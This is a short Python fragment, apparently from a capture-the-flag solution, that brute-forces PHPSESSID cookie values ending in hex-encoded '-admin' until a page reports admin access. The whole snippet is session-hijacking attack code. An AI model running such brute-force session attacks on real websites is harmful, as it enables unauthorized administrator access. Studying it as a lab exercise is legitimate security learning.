for x in range(10):
#     for y in range(10):
#         for z in range(10):
#             s_id = int(f"3{x}3{y}3{z}")
#             s_id = str(s_id) + "2d61646d696e"
#             print("Trying with PHPSESSID = " + str(s_id))
#             cookies = dict(PHPSESSID=str(s_id))
#             r = requests.get(target, auth=auth, params=params, cookies=cookies)
#             if "You are an admin" in r.text:
#                 print(r.text)
#                 break
